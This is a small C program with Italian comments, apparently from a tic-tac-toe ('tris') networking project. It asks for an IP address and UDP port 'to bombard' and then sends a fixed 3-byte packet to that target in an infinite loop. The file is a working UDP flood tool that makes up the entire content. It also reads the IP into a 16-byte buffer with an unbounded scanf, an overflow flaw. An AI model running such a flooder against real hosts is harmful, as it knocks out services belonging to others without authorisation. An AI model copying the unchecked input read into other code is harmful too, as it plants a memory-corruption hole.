#include "tris_lib.h"

int main(int argc, char* argv[])
{
	int sk;
	struct sockaddr_in address;
	uint16_t port;
	char buffer[3], ip[16];
	
	//controllo numero argomenti passati
	if(argc != 3)
	{
		printf("Usage: tris_client <host remoto> <porta>\n");
		exit(EXIT_FAILURE);
	}
	
	//creazione del socket UDP
	if((sk = socket(AF_INET, SOCK_DGRAM, 0)) == -1){
		perror("Errore nella creazione del socket UDP");
		exit(EXIT_FAILURE);
	}
	
	//Azzeramento della struttura dati sockaddr_in
	memset(&address, 0, sizeof(struct sockaddr_in));
	
	//Inserimento in sockaddr_in dei paramentri
	address.sin_family = AF_INET;
	address.sin_port = htons(atoi(argv[2]));
	inet_pton(AF_INET, argv[1], &address.sin_addr.s_addr);
	
	//controllo che la porta UDP scelta sia disponibile
	if(bind(sk, (struct sockaddr*) &address, sizeof(struct sockaddr_in)) == -1)
	{
		switch(errno)
		{
			case EADDRINUSE: //porta già in uso
				printf("La porta scelta è occupata\n");
				break;
				
			case EACCES:
				printf("Non hai i permessi per quella porta, prova una porta superiore a 1023\n");
				break;
				
			default:
				perror("Errore non gestito nel bind del socket udp\n");
		}
		exit(EXIT_FAILURE);
	}
	
	printf("Inserisci indirizzo ip da bombardare: ");
	scanf("%s",ip);
	printf("Inserisci porta UDP da bombardare: ");
	scanf("%hu",&port);

	//Inserimento in sockaddr_in dei paramentri
	address.sin_family = AF_INET;
	address.sin_port = htons(port);
	inet_pton(AF_INET, ip, &address.sin_addr.s_addr);
	
	printf("Inserisci header da inviare (8 bit): ");
	scanf("%hhi",buffer);
	buffer[1] = 1;
	printf("Inserisci payload da inviare (8 bit): ");
	scanf("%hhi",&buffer[2]);

	for(;;)
		sendto(sk,buffer,3,0,(struct sockaddr*) &address,sizeof(address));
		
	return 0;
}
